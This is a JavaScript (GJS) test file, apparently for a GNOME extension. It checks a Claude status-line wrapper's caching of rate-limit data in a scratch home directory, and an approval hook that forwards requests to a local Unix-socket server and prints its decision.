const cfg = obj => new ConfigStore({ contents: new TextEncoder().encode(JSON.stringify(obj)) });
eq(cfg({}).claudeApprove, false, 'approvals off by default');
eq(cfg({ claudeApprove: true }).claudeApprove, true, 'approvals on');

// ---- run the wrapped command for real, in a scratch HOME ----
let home = GLib.dir_make_tmp('nn-claude-XXXXXX');
let cacheFile = `${home}/.cache/notchnux/claude-usage.json`;
function runWrapped(original, input) {
    let launcher = new Gio.SubprocessLauncher({ flags: Gio.SubprocessFlags.STDIN_PIPE | Gio.SubprocessFlags.STDOUT_PIPE });
    launcher.setenv('HOME', home, true);
    let proc = launcher.spawnv(['sh', '-c', wrapCommand(original)]);
    let [, out] = proc.communicate_utf8(input, null);
    return [out, proc.get_exit_status()];
}
let [out, code] = runWrapped('', '{"cwd":"/x"}');
eq([out, code], ['', 0], 'no original: prints nothing, exit 0');
ok(!GLib.file_test(cacheFile, GLib.FileTest.EXISTS), 'no rate_limits → nothing saved');
[out] = runWrapped('cat; echo " <- seen"', usage);
eq(out, `${usage} <- seen\n`, 'original gets the same input and its output passes through');
eq(new TextDecoder().decode(GLib.file_get_contents(cacheFile)[1]), usage, 'rate_limits input saved');
runWrapped('true', '{"cwd":"/y"}');
eq(new TextDecoder().decode(GLib.file_get_contents(cacheFile)[1]), usage, 'later input without rate_limits keeps the file');

// ---- run the approve hook command for real, against a scratch socket ----
const sockPath = `${home}/nn.sock`;
function runHook(input) {
    let proc = Gio.Subprocess.new(['sh', '-c', approveCommand(sockPath)], Gio.SubprocessFlags.STDIN_PIPE | Gio.SubprocessFlags.STDOUT_PIPE);
    let loop = new GLib.MainLoop(null, false), result;
    proc.communicate_utf8_async(input, null, (p, res) => {
        result = [p.communicate_utf8_finish(res)[1], p.get_exit_status()];
        loop.quit();
    });
    loop.run();
    return result;
}
eq(runHook('{"x":1}'), ['', 0], 'nothing listening → no output, exit 0 (no decision, never a block)');
let seen = null;
const server = new Soup.Server();
server.add_handler('/claude/permission', (srv, msg) => {
    seen = [msg.get_method(), new TextDecoder().decode(msg.get_request_body().flatten().get_data())];
    msg.set_status(200, null);
    msg.set_response('application/json', Soup.MemoryUse.COPY, new TextEncoder().encode(decisionBody('allow')));
});
server.listen(Gio.UnixSocketAddress.new(sockPath), 0);
let hookIn = JSON.stringify(req('Bash', { command: "echo 'it''s' \"$HOME\"" }));
eq(runHook(hookIn), [decisionBody('allow'), 0], 'hook prints the server decision');
eq(seen, ['POST', hookIn], 'server got the hook input verbatim');
server.disconnect();
GLib.spawn_command_line_sync(`rm -rf ${GLib.shell_quote(home)}`);

print(`claude-check: ${n} checks passed`);
